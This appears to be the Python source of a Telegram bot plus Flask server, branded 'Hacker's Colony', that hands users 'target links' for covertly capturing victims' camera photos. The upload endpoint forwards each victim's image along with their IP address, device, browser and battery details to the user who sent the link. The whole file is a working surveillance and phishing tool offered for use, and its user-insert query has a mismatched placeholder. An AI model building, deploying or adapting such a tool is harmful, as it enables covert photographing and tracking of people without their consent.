import os, base64, threading, sqlite3, time, telebot
from flask import Flask, render_template, request, jsonify
from telebot import types

app = Flask(__name__)

# Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
APP_URL = "https://happy-wishing-you.onrender.com" 
ADMINS = [518067190, 7162565886]
TG_CHANNEL = "hackerscolonytech"
YT_LINK = "https://youtube.com/@hackers_colony_tech?si=ao7sXsZt8OLAj1Lc"

bot = telebot.TeleBot(BOT_TOKEN)

def db_init():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # Adding photo_count column to track per user activity
    cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, photo_count INTEGER DEFAULT 0)')
    # Global stats table
    cursor.execute('CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_photos INTEGER DEFAULT 0)')
    cursor.execute('INSERT OR IGNORE INTO stats (id, total_photos) VALUES (1, 0)')
    conn.commit()
    conn.close()

db_init()

def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(f"@{TG_CHANNEL}", user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except:
        return False

@bot.message_handler(commands=['start'])
def start(message):
    conn = sqlite3.connect('users.db'); cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (id) VALUES (?, 0)', (message.chat.id,))
    conn.commit(); conn.close()

    if is_user_joined(message.chat.id):
        show_camera_menu(message.chat.id)
    else:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("📢 Join Telegram 📢", url=f"https://t.me/{TG_CHANNEL}"),
            types.InlineKeyboardButton("📺 Subscribe YouTube 📺", url=YT_LINK),
            types.InlineKeyboardButton("✅ I Have Joined & Subscribed ✅", callback_data="check_join")
        )
        bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>\n\n⚠️ <b>Must join our channel and subscribe to our YouTube to use this bot!</b>", parse_mode='HTML', reply_markup=markup)

def show_camera_menu(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
    markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
    markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
    bot.send_message(chat_id, "<b>Select your camera mode to hack camera 📸:</b>", parse_mode='HTML', reply_markup=markup)

# --- ADMIN COMMANDS ---

@bot.message_handler(commands=['stats'])
def total_stats(message):
    if message.chat.id in ADMINS:
        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
        cursor.execute('SELECT total_photos FROM stats WHERE id = 1')
        total = cursor.fetchone()[0]
        bot.reply_to(message, f"📊 <b>Total Photos Received:</b> {total}", parse_mode='HTML')

@bot.message_handler(commands=['users'])
def user_list(message):
    if message.chat.id in ADMINS:
        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
        cursor.execute('SELECT id, photo_count FROM users')
        rows = cursor.fetchall()
        response = "👥 <b>User Activity List:</b>\n\n"
        for row in rows:
            response += f"👤 ID: <code>{row[0]}</code> | 📸 Photos: {row[1]}\n"
        bot.reply_to(message, response, parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.chat.id in ADMINS:
        msg_parts = message.text.split(None, 1)
        msg_text = msg_parts[1] if len(msg_parts) > 1 else ""
        if not msg_text:
            bot.reply_to(message, "Usage: /broadcast [Your Message]")
            return
        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
        cursor.execute('SELECT id FROM users'); users = cursor.fetchall(); conn.close()
        success = 0
        for user in users:
            try:
                bot.send_message(user[0], msg_text)
                success += 1
                time.sleep(0.1)
            except: pass
        bot.send_message(message.chat.id, f"📢 Broadcast Sent to {success} users.")

# --- END ADMIN COMMANDS ---

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    if call.data == "check_join":
        if is_user_joined(user_id):
            bot.delete_message(user_id, call.message.message_id)
            show_camera_menu(user_id)
        else:
            bot.answer_callback_query(call.id, "❌ You have not joined yet!\nFirst join channel for using bot ⚠️", show_alert=True)
    elif "m_" in call.data:
        if is_user_joined(user_id):
            mode = call.data.replace("m_", "")
            target_link = f"{APP_URL}/?m={mode}&uid={user_id}"
            bot.send_message(user_id, f"<b>🤠 Your target link 🔗</b>\n\nUrl = {target_link}\n\n✨ Thank you team HCO ✨", parse_mode='HTML', disable_web_page_preview=True)
        else:
            bot.answer_callback_query(call.id, "⚠️ Please join the channel first.", show_alert=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    try:
        img_data = base64.b64decode(data.get('image').split(',')[1])
        info = data.get('info', {})
        caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
                   f"🔋 <b>Battery:</b> {info.get('battery', 'N/A')}\n"
                   f"🌐 <b>Browser:</b> {info.get('browser', 'N/A')}\n"
                   f"📱 <b>Device:</b> {info.get('device', 'N/A')}\n"
                   f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                   f"✨ Created by Roshan ✨")
        
        # Updating database counters
        conn = sqlite3.connect('users.db'); cursor = conn.cursor()
        cursor.execute('UPDATE stats SET total_photos = total_photos + 1 WHERE id = 1')
        cursor.execute('UPDATE users SET photo_count = photo_count + 1 WHERE id = ?', (data.get('uid'),))
        conn.commit(); conn.close()
        
        bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
    except: pass
    return jsonify({"status": "success"})

if __name__ == "__main__":
    def run_bot():
        bot.remove_webhook()
        time.sleep(2)
        while True:
            try: bot.polling(none_stop=True)
            except: time.sleep(5)
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
    
